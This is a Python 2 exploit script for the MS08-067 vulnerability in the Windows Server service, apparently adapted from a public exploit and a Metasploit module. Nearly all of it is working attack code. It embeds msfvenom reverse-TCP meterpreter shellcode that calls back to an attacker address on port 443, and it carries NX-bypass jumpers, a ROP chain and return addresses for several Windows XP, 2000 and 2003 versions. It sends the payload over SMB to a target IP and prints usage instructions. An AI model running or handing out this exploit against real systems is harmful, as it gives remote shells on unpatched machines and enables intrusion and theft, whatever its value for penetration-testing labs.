#!/usr/bin/python
import struct
import time
import sys
 
 
from threading import Thread    #Thread is imported incase you would like to modify
 
 
try:
 
    from impacket import smb
 
    from impacket import uuid
 
    from impacket import dcerpc
 
    from impacket.dcerpc.v5 import transport
 
 
except ImportError, _:
 
    print 'Install the following library to make this script work'
 
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
 
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
 
    sys.exit(1)
 
 
print '#######################################################################'
 
print '#   MS08-067 Exploit'
 
print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
 
print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
 
print '#######################################################################\n'
 
 
#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x31\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += "\x76\x0e\xae\xb0\xda\xb9\x83\xee\xfc\xe2\xf4\x52\x58"
shellcode += "\x58\xb9\xae\xb0\xba\x30\x4b\x81\x1a\xdd\x25\xe0\xea"
shellcode += "\x32\xfc\xbc\x51\xeb\xba\x3b\xa8\x91\xa1\x07\x90\x9f"
shellcode += "\x9f\x4f\x76\x85\xcf\xcc\xd8\x95\x8e\x71\x15\xb4\xaf"
shellcode += "\x77\x38\x4b\xfc\xe7\x51\xeb\xbe\x3b\x90\x85\x25\xfc"
shellcode += "\xcb\xc1\x4d\xf8\xdb\x68\xff\x3b\x83\x99\xaf\x63\x51"
shellcode += "\xf0\xb6\x53\xe0\xf0\x25\x84\x51\xb8\x78\x81\x25\x15"
shellcode += "\x6f\x7f\xd7\xb8\x69\x88\x3a\xcc\x58\xb3\xa7\x41\x95"
shellcode += "\xcd\xfe\xcc\x4a\xe8\x51\xe1\x8a\xb1\x09\xdf\x25\xbc"
shellcode += "\x91\x32\xf6\xac\xdb\x6a\x25\xb4\x51\xb8\x7e\x39\x9e"
shellcode += "\x9d\x8a\xeb\x81\xd8\xf7\xea\x8b\x46\x4e\xef\x85\xe3"
shellcode += "\x25\xa2\x31\x34\xf3\xd8\xe9\x8b\xae\xb0\xb2\xce\xdd"
shellcode += "\x82\x85\xed\xc6\xfc\xad\x9f\xa9\x4f\x0f\x01\x3e\xb1"
shellcode += "\xda\xb9\x87\x74\x8e\xe9\xc6\x99\x5a\xd2\xae\x4f\x0f"
shellcode += "\xd3\xab\xd8\xd0\xb2\xae\x7a\xb2\xbb\xae\xb1\x61\x30"
shellcode += "\x48\xe0\x8a\xe9\xfe\xf0\x8a\xf9\xfe\xd8\x30\xb6\x71"
shellcode += "\x50\x25\x6c\x39\xda\xca\xef\xf9\xd8\x43\x1c\xda\xd1"
shellcode += "\x25\x6c\x2b\x70\xae\xb3\x51\xfe\xd2\xcc\x42\x58\xbb"
shellcode += "\xb9\xae\xb0\xb0\xb9\xc4\xb4\x8c\xee\xc6\xb2\x03\x71"
shellcode += "\xf1\x4f\x0f\x3a\x56\xb0\xa4\x8f\x25\x86\xb0\xf9\xc6"
shellcode += "\xb0\xca\xb9\xae\xe6\xb0\xb9\xc6\xe8\x7e\xea\x4b\x4f"
shellcode += "\x0f\x2a\xfd\xda\xda\xef\xfd\xe7\xb2\xbb\x77\x78\x85"
shellcode += "\x46\x7b\x33\x22\xb9\xd3\x92\x82\xd1\xae\xf0\xda\xb9"
shellcode += "\xc4\xb0\x8a\xd1\xa5\x9f\xd5\x89\x51\x65\x8d\xd1\xdb"
shellcode += "\xde\x97\xd8\x51\x65\x84\xe7\x51\xbc\xfe\x50\xdf\x4f"
shellcode += "\x25\x46\xaf\x73\xf3\x7f\xdb\x77\x19\x02\x4e\xad\xf0"
shellcode += "\xb3\xc6\x16\x4f\x04\x33\x4f\x0f\x85\xa8\xcc\xd0\x39"
shellcode += "\x55\x50\xaf\xbc\x15\xf7\xc9\xcb\xc1\xda\xda\xea\x51"
shellcode += "\x65\xda\xb9"

 
nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
    gadget1="\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]  
    gadget3="\xcc\x90\xeb\x5a" 
    ret=struct.pack('<L', 0x00018000)
    ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
    ret+=struct.pack('<L', 0x01040110)
    ret+=struct.pack('<L', 0x01010101)
    ret+=struct.pack('<L', 0x01010101)
    ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
    ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
    ret+=gadget1
    ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['jmp eax']+module_base)
    ret+=gadget2[0]
    ret+=gadget2[1]
    ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
    ret+=gadget2[2]
    ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
    ret+=struct.pack('<L', rvas['jmp eax']+module_base)
    ret+=gadget3    
    return ret
class SRVSVC_Exploit(Thread):
 
    def __init__(self, target, os, port=445):
 
        super(SRVSVC_Exploit, self).__init__()
 
        self.__port   = port
 
        self.target   = target
        self.os       = os
 
 
    def __DCEPacket(self):
        if (self.os=='1'):
            print 'Windows XP SP0/SP1 Universal\n'
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='2'):
            print 'Windows 2000 Universal\n'
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='3'):
            print 'Windows 2003 SP0 Universal\n'
            ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
        elif (self.os=='5'):
            print 'Windows XP SP3 French (NX)\n'
            ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
            disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
            jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
        elif (self.os=='6'):
            print 'Windows XP SP3 English (NX)\n'
            ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
            disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
            jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
        elif (self.os=='7'):
            print 'Windows XP SP3 English (AlwaysOn NX)\n'
            rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
            jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
        else:
            print 'Not supported OS version\n'
            sys.exit(-1)
        print '[-]Initiating connection'
 
        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
 
        self.__trans.connect()
 
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
 
        self.__dce = self.__trans.DCERPC_class(self.__trans)
 
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
 
 
 
 
        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2
 
        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
 
        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"
 
        return
 
 
 
    def run(self):
 
        self.__DCEPacket()
 
        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'
 
 
 
if __name__ == '__main__':
 
       try:
 
           target = sys.argv[1]
           os = sys.argv[2]
 
       except IndexError:
 
                print '\nUsage: %s <target ip>\n' % sys.argv[0]
 
                print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
                print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'
 
                sys.exit(-1)
 
 
 
current = SRVSVC_Exploit(target, os)
 
current.start()
